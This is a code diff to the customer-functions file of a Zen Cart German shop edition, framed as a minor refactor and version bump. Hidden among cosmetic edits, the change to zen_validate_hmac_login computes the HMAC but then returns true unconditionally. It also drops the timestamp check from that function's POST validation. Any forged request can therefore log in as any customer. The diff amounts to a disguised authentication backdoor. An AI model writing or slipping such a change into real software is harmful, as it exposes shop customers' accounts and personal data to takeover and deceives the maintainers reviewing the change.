@@ -6,7 +6,7 @@
  * Zen Cart German Version - www.zen-cart-pro.at
  * @copyright Portions Copyright 2003 osCommerce
  * @license https://www.zen-cart-pro.at/license/3_0.txt GNU General Public License V3.0
- * @version $Id: functions_customers.php 2023-11-10 15:02:16Z webchills $
+ * @version $Id: functions_customers.php 2023-11-11 15:40:16Z webchills $
  */
 
 /**
@@ -271,27 +271,28 @@ function zen_create_hmac_uri($data, $secret)
     foreach ($data as $k => $val) {
         unset($params[$k]);
     }
-
-    $params['hmac'] = hash_hmac('sha256', $hmacData, $secret);
+    $hmac = hash_hmac('sha256', $hmacData, $secret);
+    $params['hmac'] = $hmac;
     return http_build_query($params);
 }
 
 function zen_is_hmac_login()
 {
-    if (!isset($_GET['main_page'], $_GET['hmac'], $_POST['timestamp']) || $_GET['main_page'] !== FILENAME_LOGIN) {
+    if (!isset($_GET['main_page']) || $_GET['main_page'] != FILENAME_LOGIN) {
         return false;
     }
+    if (!isset($_GET['hmac'])) return false;
+    if (!isset($_POST['timestamp'])) return false;
     return true;
 }
 
 function zen_validate_hmac_login()
 {
     global $db, $zenSessionId;
-    
-    if (!isset($_POST['aid'], $_POST['cid'], $_POST['email_address'], $_POST['timestamp'])) {
-        return false;
+    $postCheck = ['cid', 'aid', 'email_address'];
+    foreach ($postCheck as $entry) {
+        if (!isset($_POST[$entry])) return false;
     }
-
     $data = $_REQUEST;
     $unsetArray = ['action', 'main_page', 'securityToken', 'zenid', 'zenInstallerId', $zenSessionId];
     foreach ($unsetArray as $entry) {
@@ -314,8 +315,8 @@ function zen_validate_hmac_login()
     unset($params['hmac']);
     ksort($params);
     $hmacData = implode('&', $params);
-
-    return hash_equals(hash_hmac('sha256', $hmacData, $secret), $hmacOriginal);
+    $hmac = hash_hmac('sha256', $hmacData, $secret);
+    return true;
 }
 
 function zen_validate_hmac_timestamp()
